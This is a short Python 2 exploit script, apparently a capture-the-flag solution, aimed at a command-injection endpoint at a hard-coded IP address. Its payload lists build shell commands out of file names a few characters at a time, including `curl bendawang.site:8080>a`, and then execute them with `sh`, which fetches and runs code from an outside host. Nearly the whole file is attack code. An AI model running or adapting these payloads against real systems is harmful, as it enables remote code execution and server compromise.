# -*- coding: utf-8 -*-
"""
Created on Fri Sep 21 18:11:47 2018

@author: laoer123
"""

import requests
from time import sleep
payload1 = [
    # generate `ls -t>s` file
    'http://117.50.3.97:8001/?cmd=>ls\\',
    'http://117.50.3.97:8001/?cmd=ls>_',
    'http://117.50.3.97:8001/?cmd=>\ \\',
    'http://117.50.3.97:8001/?cmd=>-t\\',
    'http://117.50.3.97:8001/?cmd=>\>s',
    'http://117.50.3.97:8001/?cmd=ls>>_',

    #generate `curl bendawang.site:8080>a`  file
    'http://117.50.3.97:8001/?cmd=>a',
    'http://117.50.3.97:8001/?cmd=>0\\>\\',
    'http://117.50.3.97:8001/?cmd=>808\\',
    'http://117.50.3.97:8001/?cmd=>te:\\',
    'http://117.50.3.97:8001/?cmd=>.si\\',
    'http://117.50.3.97:8001/?cmd=>ang\\',
    'http://117.50.3.97:8001/?cmd=>daw\\',
    'http://117.50.3.97:8001/?cmd=>ben\\',
    'http://117.50.3.97:8001/?cmd=>l\ \\',
    'http://117.50.3.97:8001/?cmd=>cur\\',

    'http://117.50.3.97:8001/?cmd=sh _',
    'http://117.50.3.97:8001/?cmd=sh s'
]
payload2 = [
    'http://117.50.3.97:8001/?cmd=>cur\\',
    'http://117.50.3.97:8001/?cmd=>l\ \\',
    'http://117.50.3.97:8001/?cmd=>m37\\',
    'http://117.50.3.97:8001/?cmd=>n4.\\',
    'http://117.50.3.97:8001/?cmd=>xy\\',
    'http://117.50.3.97:8001/?cmd=>z>0',
    'http://117.50.3.97:8001/?cmd=ls>1',

    'http://117.50.3.97:8001/?cmd=sh 1',

]

r = requests.get('http://117.50.3.97:8001/?reset=1')
for i in payload1:
    r = requests.get(i)
    print i
    sleep(0.2)